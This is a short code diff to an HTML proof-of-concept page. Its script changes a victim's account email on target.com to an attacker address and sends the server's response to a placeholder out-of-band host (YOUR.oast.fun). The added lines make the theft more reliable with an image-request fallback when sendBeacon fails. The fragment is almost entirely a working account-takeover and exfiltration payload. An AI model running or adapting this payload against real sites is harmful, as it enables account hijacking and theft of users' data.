@@ -14,7 +14,12 @@ fetch('https://target.com/api/account/email', {
   body: JSON.stringify({ email: 'attacker@my-inbox.example' })
 })
 .then(r => r.text())
-.then(t => navigator.sendBeacon('https://YOUR.oast.fun/leak', t))
+.then(t => {
+  // sendBeacon returns FALSE on failure/oversize (it does NOT throw) — check the return, else fall back to an <img> GET.
+  if (!navigator.sendBeacon('https://YOUR.oast.fun/leak', t)) {
+    new Image().src = 'https://YOUR.oast.fun/leak?d=' + encodeURIComponent(t);
+  }
+})
 .catch(e => navigator.sendBeacon('https://YOUR.oast.fun/leak', 'err:'+e));
 </script>
 </body></html>
